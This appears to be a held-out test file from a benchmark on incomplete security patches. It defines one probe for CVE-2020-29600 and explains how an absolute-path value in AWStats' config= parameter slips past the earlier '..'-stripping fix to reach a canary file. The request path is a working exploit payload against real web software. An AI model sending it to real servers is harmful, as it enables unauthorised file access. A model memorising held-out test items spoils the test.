#!/usr/bin/env python3
"""[HELD-OUT] CVE-2020-29600 residual exploit — an ABSOLUTE-pathname bypass of
the AWStats `config=` traversal guard.

The CVE-2017-1000501 fix (patch.diff) only strips `..` segments
(`$SiteConfig =~ s/\\.\\.//g`). It never removed AWStats' File::Spec->rel2abs
fallback in Read_Config, which opens `config=` as-is when it is already an
absolute path. An absolute pathname contains NO `..` to strip, so it slips past
the fix untouched — exactly what CVE-2020-29600 reports:
"cgi-bin/awstats.pl?config= accepts an absolute pathname ... this issue exists
because of an incomplete fix for CVE-2017-1000501."

Contract: reaches the canary (flag) on V1 (AWStats 7.7) => the case is a
legitimate incomplete-patch positive. Closed on V2 (AWStats 7.8), which
comments out the rel2abs absolute-path fallback.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# Pure absolute pathname to the out-of-tree canary — no `..`, so the 7.7 fix's
# `s/\.\.//g` is a no-op; Read_Config's rel2abs fallback opens it directly.
PATH = "/cgi-bin/awstats.pl?config=/pcb_canary/flag.conf"


def candidate() -> dict:
    return {"probe_id": "cve-2020-29600-absolute-config", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
